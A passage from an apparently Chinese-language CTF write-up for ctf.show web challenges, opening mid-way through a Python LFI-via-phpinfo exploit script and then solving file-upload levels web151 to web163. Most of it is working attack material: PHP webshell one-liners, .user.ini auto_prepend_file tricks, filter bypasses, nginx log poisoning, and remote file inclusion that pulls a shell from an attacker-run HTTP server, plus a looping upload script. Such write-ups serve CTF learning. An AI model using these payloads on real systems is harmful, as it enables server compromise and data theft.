</span></span><span class="line"><span class="ln"> 78</span><span class="cl">                <span class="n">counter</span><span class="o">+=</span><span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 79</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">                <span class="n">x</span> <span class="o">=</span> <span class="n">phpInfoLFI</span><span class="p">(</span><span class="o">*</span><span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">                    <span class="k">break</span>                
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">                <span class="k">if</span> <span class="n">x</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">                    <span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Got it! Shell created in /tmp/g&#34;</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">                    <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">                    
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">            <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">    
</span></span><span class="line"><span class="ln"> 91</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 92</span><span class="cl"><span class="k">def</span> <span class="nf">getOffset</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">phpinforeq</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 93</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Gets offset of tmp_name in the php output&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">phpinforeq</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">    
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">100</span><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">101</span><span class="cl">        <span class="n">d</span><span class="o">+=</span><span class="n">i</span>        
</span></span><span class="line"><span class="ln">102</span><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">103</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl">        <span class="c1"># detect the final chunk</span>
</span></span><span class="line"><span class="ln">105</span><span class="cl">        <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;0</span><span class="se">\r\n\r\n</span><span class="s2">&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">106</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">107</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">108</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;[tmp_name] =&amp;gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">109</span><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">110</span><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;No php tmp_name in phpinfo output&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">111</span><span class="cl">    
</span></span><span class="line"><span class="ln">112</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;found </span><span class="si">%s</span><span class="s2"> at </span><span class="si">%i</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">10</span><span class="p">],</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">113</span><span class="cl">    <span class="c1"># padded up a bit</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl">    <span class="k">return</span> <span class="n">i</span><span class="o">+</span><span class="mi">256</span>
</span></span><span class="line"><span class="ln">115</span><span class="cl"> 
</span></span><span class="line"><span class="ln">116</span><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">117</span><span class="cl">    
</span></span><span class="line"><span class="ln">118</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;LFI With PHPInfo()&#34;</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;-=&#34;</span> <span class="o">*</span> <span class="mi">30</span>
</span></span><span class="line"><span class="ln">120</span><span class="cl"> 
</span></span><span class="line"><span class="ln">121</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">122</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Usage: </span><span class="si">%s</span><span class="s2"> host [port] [threads]&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">123</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">124</span><span class="cl"> 
</span></span><span class="line"><span class="ln">125</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">126</span><span class="cl">        <span class="n">host</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">127</span><span class="cl">    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Error with hostname </span><span class="si">%s</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">129</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">130</span><span class="cl"> 
</span></span><span class="line"><span class="ln">131</span><span class="cl">    <span class="n">port</span><span class="o">=</span><span class="mi">80</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">134</span><span class="cl">    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">135</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">136</span><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">137</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Error with port </span><span class="si">%d</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">138</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">139</span><span class="cl">    
</span></span><span class="line"><span class="ln">140</span><span class="cl">    <span class="n">poolsz</span><span class="o">=</span><span class="mi">10</span>
</span></span><span class="line"><span class="ln">141</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">142</span><span class="cl">        <span class="n">poolsz</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">143</span><span class="cl">    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">144</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">145</span><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Error with poolsz </span><span class="si">%d</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">147</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">148</span><span class="cl"> 
</span></span><span class="line"><span class="ln">149</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Getting initial offset...&#34;</span><span class="p">,</span>  
</span></span><span class="line"><span class="ln">150</span><span class="cl">    <span class="n">reqphp</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">reqlfi</span> <span class="o">=</span> <span class="n">setup</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">151</span><span class="cl">    <span class="n">offset</span> <span class="o">=</span> <span class="n">getOffset</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">reqphp</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">153</span><span class="cl"> 
</span></span><span class="line"><span class="ln">154</span><span class="cl">    <span class="n">maxattempts</span> <span class="o">=</span> <span class="mi">1000</span>
</span></span><span class="line"><span class="ln">155</span><span class="cl">    <span class="n">e</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">156</span><span class="cl">    <span class="n">l</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">157</span><span class="cl"> 
</span></span><span class="line"><span class="ln">158</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Spawning worker pool (</span><span class="si">%d</span><span class="s2">)...&#34;</span> <span class="o">%</span> <span class="n">poolsz</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">160</span><span class="cl"> 
</span></span><span class="line"><span class="ln">161</span><span class="cl">    <span class="n">tp</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="ln">162</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">poolsz</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">163</span><span class="cl">        <span class="n">tp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ThreadWorker</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">l</span><span class="p">,</span><span class="n">maxattempts</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">reqphp</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">reqlfi</span><span class="p">,</span> <span class="n">tag</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">164</span><span class="cl"> 
</span></span><span class="line"><span class="ln">165</span><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">166</span><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">167</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">168</span><span class="cl">        <span class="k">while</span> <span class="ow">not</span> <span class="n">e</span><span class="o">.</span><span class="n">wait</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">169</span><span class="cl">            <span class="k">if</span> <span class="n">e</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">170</span><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="ln">171</span><span class="cl">            <span class="k">with</span> <span class="n">l</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">172</span><span class="cl">                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="si">% 4d</span><span class="s2"> / </span><span class="si">% 4d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">counter</span><span class="p">,</span> <span class="n">maxattempts</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">173</span><span class="cl">                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">174</span><span class="cl">                <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;=</span> <span class="n">maxattempts</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">175</span><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="ln">176</span><span class="cl">        <span class="nb">print</span>
</span></span><span class="line"><span class="ln">177</span><span class="cl">        <span class="k">if</span> <span class="n">e</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">178</span><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;Woot!  \m/&#34;</span>
</span></span><span class="line"><span class="ln">179</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">180</span><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;:(&#34;</span>
</span></span><span class="line"><span class="ln">181</span><span class="cl">    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">182</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Telling threads to shutdown...&#34;</span>
</span></span><span class="line"><span class="ln">183</span><span class="cl">        <span class="n">e</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">184</span><span class="cl">    
</span></span><span class="line"><span class="ln">185</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Shuttin&#39; down...&#34;</span>
</span></span><span class="line"><span class="ln">186</span><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">187</span><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">188</span><span class="cl"> 
</span></span><span class="line"><span class="ln">189</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">190</span><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="文件上传">文件上传<a hidden class="anchor" aria-hidden="true" href="#文件上传">#</a></h3>
<h4 id="web151">web151<a hidden class="anchor" aria-hidden="true" href="#web151">#</a></h4>
<p><img alt="image-20250126161249975" loading="lazy" src="./assets/image-20250126161249975.png"></p>
<p>前台验证</p>
<p>将一句话木马改成png，抓包修改后缀即可</p>
<p><img alt="image-20250126162045356" loading="lazy" src="./assets/image-20250126162045356.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>1=system(&#39;cat /var/www/html/flag.php&#39;);
</code></pre><h4 id="web152">web152<a hidden class="anchor" aria-hidden="true" href="#web152">#</a></h4>
<p>这道题没有前端检验，但是解法跟web151是一样的</p>
<p><img alt="image-20250126162605410" loading="lazy" src="./assets/image-20250126162605410.png"></p>
<h4 id="web153">web153<a hidden class="anchor" aria-hidden="true" href="#web153">#</a></h4>
<p>一开始尝试了大小写绕过</p>
<p><img alt="image-20250126162904156" loading="lazy" src="./assets/image-20250126162904156.png"></p>
<p>上传后发现服务器不解析</p>
<p>这题可以利用.user.ini来进行文件上传</p>
<p>[<a href="https://blog.csdn.net/cosmoslin/article/details/120793126">文件上传]浅析.user.ini的利用-CSDN博客</a></p>
<p>首先我们在文件中写入</p>
<p><img alt="image-20250126180536890" loading="lazy" src="./assets/image-20250126180536890.png"></p>
<p>这句话相当于php中的文件包含</p>
<p>写入后将文件改为png上传，抓包将文件名改为.user.ini</p>
<p><img alt="image-20250126181011811" loading="lazy" src="./assets/image-20250126181011811.png"></p>
<p>接着将一句话木马改为1.png上传</p>
<p><img alt="image-20250126181138882" loading="lazy" src="./assets/image-20250126181138882.png"></p>
<p>接着访问 /upload/index.php</p>
<p>payload:</p>
<pre tabindex="0"><code>1=system(&#39;tac ../f*&#39;);
</code></pre><p><img alt="image-20250126181319071" loading="lazy" src="./assets/image-20250126181319071.png"></p>
<p>注意这个方法的前提是文件上传的目录中有能够执行的php的文件（如index.php）</p>
<h4 id="web154">web154<a hidden class="anchor" aria-hidden="true" href="#web154">#</a></h4>
<p>这题跟上题差不多，只是过滤了php</p>
<p>将一句话木马改成短标签的形式就可以了（我一直用的短标签所以没什么影响）</p>
<h4 id="web155">web155<a hidden class="anchor" aria-hidden="true" href="#web155">#</a></h4>
<p>解法同web154一样</p>
<h4 id="web156">web156<a hidden class="anchor" aria-hidden="true" href="#web156">#</a></h4>
<p><img alt="image-20250126194012094" loading="lazy" src="./assets/image-20250126194012094.png"></p>
<p>这题有新的waf,可以测出来waf掉了[]</p>
<p>那既然这样我们直接读flag就是了</p>
<pre tabindex="0"><code>&lt;?=system(&#39;cat ../f*&#39;);?&gt;
</code></pre><p>或者也可以用{}代替[&rsquo;&rsquo;]</p>
<pre tabindex="0"><code>&lt;?=@eval($_GET{1});?&gt;
</code></pre><h4 id="web157">web157<a hidden class="anchor" aria-hidden="true" href="#web157">#</a></h4>
<p><img alt="image-20250126203400690" loading="lazy" src="./assets/image-20250126203400690.png"></p>
<p>这道题[]和;都被waf了</p>
<p>payload:</p>
<pre tabindex="0"><code>&lt;?=system(&#34;tac ../f*&#34;)?&gt;
</code></pre><p>不写;就行了</p>
<h4 id="web158">web158<a hidden class="anchor" aria-hidden="true" href="#web158">#</a></h4>
<p>这题和上题的解法一样</p>
<h4 id="web159">web159<a hidden class="anchor" aria-hidden="true" href="#web159">#</a></h4>
<p><img alt="image-20250126205519235" loading="lazy" src="./assets/image-20250126205519235.png"></p>
<p>这题waf掉了()</p>
<p>没有()怎么进行rce呢？我们可以想到``进行命令执行的技巧</p>
<p>payload:</p>
<pre tabindex="0"><code>&lt;?=`tac ../f*`?&gt;
</code></pre><h4 id="web160">web160<a hidden class="anchor" aria-hidden="true" href="#web160">#</a></h4>
<p><img alt="image-20250126211936519" loading="lazy" src="./assets/image-20250126211936519.png"></p>
<p>一开始发现.user.ini穿不上，后面测到原来是空格被waf了，.user.ini里也不能有空格</p>
<p>相比上一题这题将空格和``反引号和log过滤掉了</p>
<p>这题我们可以考虑使用日志注入的方法</p>
<p>尝试一下包含日志 nginx的log在/var/log/nginx/access.log</p>
<p>payload:</p>
<pre tabindex="0"><code>&lt;?=include&#34;/var/l&#34;.&#34;og/nginx/access.l&#34;.&#34;og&#34;?&gt;
</code></pre><p><img alt="image-20250126213809672" loading="lazy" src="./assets/image-20250126213809672.png"></p>
<p>看到有user-agent说明这条路行得通</p>
<p><img alt="image-20250126214026378" loading="lazy" src="./assets/image-20250126214026378.png"></p>
<p>直接读flag</p>
<p><img alt="image-20250126214050381" loading="lazy" src="./assets/image-20250126214050381.png"></p>
<h4 id="web161">web161<a hidden class="anchor" aria-hidden="true" href="#web161">#</a></h4>
<p>这一题在上一题的基础上增加了文件头的检验</p>
<p>我们可以通过在上传文件的时候加上图片的文件头<strong>GIF89a</strong>进行绕过</p>
<p><img alt="image-20250126214924176" loading="lazy" src="./assets/image-20250126214924176.png"></p>
<p>其余和web160无异，利用文件包含进行日志注入即可</p>
<h4 id="web162">web162<a hidden class="anchor" aria-hidden="true" href="#web162">#</a></h4>
<p><img alt="image-20250127133207076" loading="lazy" src="./assets/image-20250127133207076.png"></p>
<p>fuzz一下可以发现这题把.也ban掉了</p>
<p>所以我们在上传的.user.ini时我们可以去掉文件后缀</p>
<p><img alt="image-20250127133616972" loading="lazy" src="./assets/image-20250127133616972.png"></p>
<pre tabindex="0"><code>GIF89a
auto_prepend_file=1
</code></pre><p>接下来考虑怎么构造读flag</p>
<p>可以通过取反绕过.的过滤，进行文件包含</p>
<pre tabindex="0"><code>&lt;?=$a=&#34;Ñ&#34;?&gt;  
&lt;?=$b=~$a?&gt;
&lt;?=$l=&#34;l&#34;?&gt;
&lt;?=$o=&#34;o&#34;?&gt;
&lt;?=$g=&#34;g&#34;?&gt;
&lt;?=include&#34;/var/$l$o$g/nginx/access$b$l$o$g&#34;?&gt;
</code></pre><p>文件 1 中的内容 下面的Ñ 为 . 取反后的字符 十六进制为 D1，利用的时候，在brup 中更改hex里的值。</p>
<p><img alt="image-20250127170656873" loading="lazy" src="./assets/image-20250127170656873.png"></p>
<p><img alt="image-20250127170901922" loading="lazy" src="./assets/image-20250127170901922.png"></p>
<p><img alt="image-20250127171226549" loading="lazy" src="./assets/image-20250127171226549.png"></p>
<p>日志注入即可</p>
<h4 id="web163">web163<a hidden class="anchor" aria-hidden="true" href="#web163">#</a></h4>
<p>这题和上题的条件差不多，但是存在竞争条件，上传图片的话会被删掉</p>
<p>这题我们尝试使用<strong>远程文件包含</strong></p>
<p><img alt="image-20250127182717535" loading="lazy" src="./assets/image-20250127182717535.png"></p>
<p>我们把payload写在服务器上，然后起一个http服务</p>
<p><img alt="image-20250127182913096" loading="lazy" src="./assets/image-20250127182913096.png"></p>
<p>记住，文件包含时要把ip转换成长整型（.被waf了）</p>
<pre tabindex="0"><code>GIF89a
auto_prepend_file=http://长整型ip:7777/s
</code></pre><p><img alt="image-20250127183049980" loading="lazy" src="./assets/image-20250127183049980.png"></p>
<p>传.user.ini</p>
<p>接着搓一个发包脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="n">burp0_url</span> <span class="o">=</span> <span class="s2">&#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="n">burp1_url</span> <span class="o">=</span> <span class="s2">&#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/upload/&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Sec-Ch-Ua-Platform&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">Windows</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,zh;q=0.9&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Ch-Ua&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">Not?A_Brand</span><span class="se">\&#34;</span><span class="s2">;v=</span><span class="se">\&#34;</span><span class="s2">99</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">Chromium</span><span class="se">\&#34;</span><span class="s2">;v=</span><span class="se">\&#34;</span><span class="s2">130</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Ch-Ua-Mobile&#34;</span><span class="p">:</span> <span class="s2">&#34;?0&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json, text/javascript, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=----WebKitFormBoundaryBcDoqZWhQP52WEA6&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="s2">&#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Fetch-Site&#34;</span><span class="p">:</span> <span class="s2">&#34;same-origin&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Fetch-Mode&#34;</span><span class="p">:</span> <span class="s2">&#34;cors&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Fetch-Dest&#34;</span><span class="p">:</span> <span class="s2">&#34;empty&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show/&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate, br&#34;</span><span class="p">,</span> <span class="s2">&#34;Priority&#34;</span><span class="p">:</span> <span class="s2">&#34;u=1, i&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;keep-alive&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">burp0_data</span> <span class="o">=</span> <span class="s2">&#34;------WebKitFormBoundaryBcDoqZWhQP52WEA6</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">file</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">.user.ini</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/png</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a</span><span class="se">\r\n</span><span class="s2">auto_prepend_file=http://长整型ip:7777/shell</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundaryBcDoqZWhQP52WEA6--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
